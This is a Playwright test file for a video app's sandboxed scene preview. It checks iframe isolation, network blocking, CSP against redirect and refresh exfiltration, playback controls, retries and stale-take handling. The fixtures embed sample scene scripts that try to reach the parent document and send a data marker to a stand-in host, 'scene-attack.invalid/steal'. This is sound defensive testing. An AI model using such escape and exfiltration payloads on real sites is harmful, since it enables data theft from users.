import {test,expect,type Page} from '@playwright/test';
import {sceneSrcdoc} from '../../../src/services/video/quick/scene-srcdoc';
const pid='10000000-0000-4000-8000-000000000001',op='20000000-0000-4000-8000-000000000002';
const shot={id:'shot-1',startSec:0,endSec:5,scriptLine:'一轮明月',visualIntent:'明月升起',state:'drawn',sourceAvailable:true,sourceOperationId:op,sourceTake:1};
const view={projectId:pid,title:'实时镜头',controlVersion:1,briefVersion:1,phase:'generating',understanding:{subject:'中秋',audience:'家人',summary:[]},preferences:{durationSec:30,aspect:'16:9',language:'zh-CN',styleSlug:'paper-lantern'},quick:{music:{mode:'auto'},tracks:[]},assets:[],messages:[{id:'message-1',role:'user',text:'中秋',ordinal:1,status:'completed',contentVersion:1}],currentResult:null,previousResult:null,activeConversation:null,activeProduction:{id:op,kind:'preview',status:'running',streamEpoch:0},pendingInputs:[],actions:[],expiresAt:'2030-01-01T00:00:00Z',script:{state:'ready',briefVersion:1,summary:'月亮升起',selectionReason:'温暖',shots:[shot]}};
const srcdoc=sceneSrcdoc(`<html><body><output id="clock">0.00</output><output id="parent">pending</output><output id="network">pending</output><script>window.READY=true;window.render=time=>document.querySelector('#clock').textContent=time.toFixed(2);try{parent.document.body.dataset.compromised='yes';document.querySelector('#parent').textContent='escaped'}catch{document.querySelector('#parent').textContent='blocked'}fetch('https://scene-attack.invalid/steal').then(()=>document.querySelector('#network').textContent='escaped').catch(()=>document.querySelector('#network').textContent='blocked');</script></body></html>`,5);
async function setup(page:Page,shots=[shot]){await page.route(`**/api/video/projects/${pid}`,r=>r.fulfill({json:{...view,script:{...view.script,shots}}}));await page.route('**/api/video/capabilities',r=>r.fulfill({json:{unsafeNoSandbox:false}}));await page.route('**/operations/*/events',r=>r.fulfill({contentType:'text/event-stream',body:': heartbeat\n\n'}));await page.route('**/analytics',r=>r.fulfill({json:{}}))}
test('live scene stays opaque, blocks network and supports play pause and seek',async({page})=>{
 await setup(page);let external=0;await page.route('https://scene-attack.invalid/**',r=>{external++;return r.abort()});const requests:string[]=[];await page.route(`**/api/video/projects/${pid}/scene?**`,r=>{requests.push(r.request().url());return r.fulfill({json:{srcdoc,durationSec:5,width:1920,height:1080}})});
 await page.goto(`/video/${pid}`);const frame=page.locator('iframe[title="第 1 镜实时预览"]');await expect(frame).toBeVisible();await expect(frame).toHaveAttribute('sandbox','allow-scripts');expect(new Set(requests).size).toBe(1);expect(requests[0]).toContain(`operationId=${op}&shotId=shot-1&take=1`);
 const content=page.frameLocator('iframe[title="第 1 镜实时预览"]');await expect(content.locator('#parent')).toHaveText('blocked');await expect(content.locator('#network')).toHaveText('blocked');expect(await page.locator('body').getAttribute('data-compromised')).toBeNull();expect(external).toBe(0);
 await page.getByRole('button',{name:'播放第 1 镜预览',exact:true}).click();await expect.poll(()=>content.locator('#clock').textContent()).not.toBe('0.00');await page.getByRole('button',{name:'暂停第 1 镜预览',exact:true}).click();const paused=Number(await page.getByRole('slider',{name:'第 1 镜预览进度'}).inputValue()).toFixed(2);await expect(content.locator('#clock')).toHaveText(paused);await page.evaluate(()=>new Promise(resolve=>requestAnimationFrame(()=>requestAnimationFrame(resolve))));await expect(content.locator('#clock')).toHaveText(paused!);await page.getByRole('slider',{name:'第 1 镜预览进度'}).fill('3');await expect(content.locator('#clock')).toHaveText('3.00');expect(paused).not.toBe('3.00');
 await expect(page.getByText('实时预览，最终画面以成片为准。',{exact:true})).toBeVisible();await page.setViewportSize({width:390,height:844});await page.getByRole('button',{name:/^画布/}).click();await expect(frame).toBeVisible();expect((await frame.boundingBox())!.width).toBeLessThan(390);expect(await page.evaluate(()=>document.documentElement.scrollWidth)).toBeLessThanOrEqual(390);
});
test('unavailable scene keeps the poster and offers a readable retry',async({page})=>{
 await setup(page,[{...shot,posterArtifactId:'poster-1'} as typeof shot]);await page.route('**/access?purpose=download',r=>r.fulfill({json:{url:'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>'}}));let count=0;await page.route('**/scene?**',r=>{count++;return r.fulfill({status:503,json:{error:{code:'SCENE_UNAVAILABLE'}}})});
 await page.goto(`/video/${pid}`);await expect(page.getByText('实时预览暂时无法载入，已画好的镜头仍会继续生成。')).toBeVisible();await expect(page.getByAltText('第 1 镜：明月升起')).toBeVisible();const attempts=count;await page.getByRole('button',{name:'重试第 1 镜预览'}).click();await expect.poll(()=>count).toBe(attempts+1);await expect(page.locator('iframe')).toHaveCount(0);
});
test('shots without available source and finished clips never request scene source',async({page})=>{
 await setup(page,[{...shot,sourceAvailable:false},{...shot,id:'shot-2',clipArtifactId:'clip-2'} as typeof shot,{...shot,id:'shot-3',state:'drawing'}]);let scenes=0;await page.route('**/scene?**',r=>{scenes++;return r.abort()});await page.goto(`/video/${pid}`);await expect(page.getByRole('button',{name:'播放第 2 镜',exact:true})).toBeVisible();expect(scenes).toBe(0);await expect(page.locator('iframe')).toHaveCount(0);
});
test('unsafe local runtime reports a prominent warning without blocking the canvas',async({page})=>{
 await setup(page,[{...shot,sourceAvailable:false}]);await page.route('**/api/video/capabilities',r=>r.fulfill({json:{unsafeNoSandbox:true}}));await page.goto(`/video/${pid}`);await expect(page.getByRole('alert').filter({hasText:'浏览器沙箱已关闭'})).toBeVisible();await expect(page.locator('#canvas-script')).toBeVisible();
});

test('a late source response cannot replace a newer take',async({page})=>{
 await setup(page);let take=1;await page.route(`**/api/video/projects/${pid}`,r=>r.fulfill({json:{...view,controlVersion:take,script:{...view.script,shots:[{...shot,sourceTake:take}]}}}));let release!:()=>void;const gate=new Promise<void>(resolve=>{release=resolve});let pending=0,settled=0;
 await page.route('**/scene?**',async r=>{const requested=Number(new URL(r.request().url()).searchParams.get('take'));if(requested===1){pending++;await gate}await r.fulfill({json:{srcdoc:srcdoc.replace('<output id="clock">',`<p id="take">take-${requested}</p><output id="clock">`),durationSec:5,width:1920,height:1080}}).catch(()=>{});if(requested===1)settled++});
 await page.goto(`/video/${pid}`);await expect.poll(()=>pending).toBeGreaterThan(0);take=2;await page.evaluate(()=>window.dispatchEvent(new Event('focus')));const content=page.frameLocator('iframe[title="第 1 镜实时预览"]');await expect(content.locator('#take')).toHaveText('take-2');release();await expect.poll(()=>settled).toBe(pending);await page.evaluate(()=>new Promise(resolve=>requestAnimationFrame(()=>requestAnimationFrame(resolve))));await expect(content.locator('#take')).toHaveText('take-2');await expect(page.locator('iframe')).toHaveCount(1);
});

test('unavailable capabilities never block the canvas or imply unsafe mode',async({page})=>{
 await setup(page,[{...shot,sourceAvailable:false}]);await page.route('**/api/video/capabilities',r=>r.fulfill({status:503,json:{}}));await page.goto(`/video/${pid}`);await expect(page.locator('#canvas-script')).toBeVisible();await expect(page.getByRole('alert').filter({hasText:'浏览器沙箱已关闭'})).toHaveCount(0);
});

for(const attack of ['location','refresh','redirect'] as const)test(`parent HTTP CSP prevents scene ${attack} exfiltration`,async({page,baseURL})=>{
 await setup(page);let outbound=0,redirects=0;const violations:string[]=[];
 page.on('console',message=>{if(message.text().includes('frame-src'))violations.push(message.text())});
 page.on('request',request=>{if(request.url().startsWith('https://scene-attack.invalid/'))outbound++});
 await page.route('https://scene-attack.invalid/**',route=>route.abort());
 await page.route('**/scene-exfil-redirect',route=>{redirects++;return route.fulfill({status:302,headers:{location:'https://scene-attack.invalid/steal?bytes=PRIVATE_TEST_MARKER'}})});
 const target=attack==='redirect'?new URL('/scene-exfil-redirect',baseURL).href:'https://scene-attack.invalid/steal?bytes=PRIVATE_TEST_MARKER';
 const source=attack==='refresh'?`<meta http-equiv="refresh" content="0;url=${target}">`:`<body><img src="data:image/png;base64,PRIVATE_TEST_MARKER"><script>window.READY=true;window.render=()=>{};setTimeout(()=>{location.href=${attack==='redirect'?JSON.stringify(target):"['https:','','scene-attack.invalid','steal?bytes='+document.querySelector('img').src.split(',')[1]].join('/')"}},50)</script>`;
 await page.route('**/scene?**',route=>route.fulfill({json:{srcdoc:sceneSrcdoc(source,5),durationSec:5,width:1920,height:1080}}));
 const response=await page.goto(`/video/${pid}`);await expect.poll(()=>outbound>0||redirects>0||violations.length>0).toBe(true);
 expect(outbound).toBe(0);expect(redirects).toBe(0);expect(response?.headers()['content-security-policy']).toContain("frame-src 'none'");
 await expect(page).toHaveURL(new RegExp(`/video/${pid}$`));await expect(page.getByRole('textbox',{name:'说说想法，或发点资料'})).toBeVisible();await expect(page.locator('#canvas-script')).toBeVisible();
});
